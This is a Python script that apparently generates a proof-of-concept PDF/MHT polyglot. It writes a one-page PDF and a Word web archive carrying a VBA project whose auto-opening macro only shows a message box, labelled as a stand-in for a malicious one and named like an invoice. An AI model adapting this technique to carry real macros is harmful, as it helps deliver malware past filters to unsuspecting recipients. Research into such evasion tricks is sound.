#!/usr/bin/env python3
"""Writes the two demo parts: a one-page PDF and a Word MHT with a VBA project.
The Makefile appends the MHT after the PDF's %%EOF."""
import argparse
import base64
import quopri

from editdata_mso import editdata_mso


def tiny_pdf(text):
    # Minimal one-page PDF with correct xref offsets.
    stream = f"BT /F1 24 Tf 72 720 Td ({text}) Tj ET".encode()
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out, offsets = bytearray(b"%PDF-1.4\n"), []
    for i, body in enumerate(objs, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
    return bytes(out)


# Stands in for the malicious macro. It only shows a message box.
MACRO = """\
Sub AutoOpen()
    MsgBox "This came from the MHT side of the polyglot", vbInformation, "Polyglot POC"
End Sub

Private Sub Document_Open()
    AutoOpen
End Sub
"""

# Word "Single File Web Page" HTML. The Edit-Time-Data link points at the VBA container.
HTML = """\
<html xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">
<head>
<meta http-equiv=Content-Type content="text/html; charset=us-ascii">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 15">
<link rel=Edit-Time-Data href="invoice_files/editdata.mso">
<!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:View>Print</w:View>
  <w:Zoom>100</w:Zoom>
 </w:WordDocument>
</xml><![endif]-->
<title>Polyglot POC</title>
</head>
<body lang=EN-US>
<div class=WordSection1>
<p class=MsoNormal>This came from the MHT side of the polyglot</p>
</div>
</body>
</html>
"""


def mht(html, mso):
    boundary = "----=_NextPart_01DA1A2B.3C4D5E6F"
    return (
        "MIME-Version: 1.0\r\n"
        f'Content-Type: multipart/related; boundary="{boundary}"\r\n'
        "\r\n"
        "This document is a Single File Web Page, also known as a Web Archive file.\r\n"
        "\r\n"
        f"--{boundary}\r\n"
        "Content-Location: file:///C:/polyglot/invoice.htm\r\n"
        "Content-Transfer-Encoding: quoted-printable\r\n"
        'Content-Type: text/html; charset="us-ascii"\r\n'
        "\r\n" + quopri.encodestring(html.encode()).decode() + "\r\n"
        f"--{boundary}\r\n"
        "Content-Location: file:///C:/polyglot/invoice_files/editdata.mso\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "Content-Type: application/x-mso\r\n"
        "\r\n" + base64.encodebytes(mso).decode() + "\r\n"
        f"--{boundary}--\r\n"
    ).encode()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pdf", required=True)
    ap.add_argument("--mht", required=True)
    a = ap.parse_args()

    with open(a.pdf, "wb") as f:
        f.write(tiny_pdf("This is the PDF side of the polyglot"))
    with open(a.mht, "wb") as f:
        f.write(mht(HTML, editdata_mso(MACRO)))
    print(f"wrote {a.pdf} and {a.mht}")


if __name__ == "__main__":
    main()
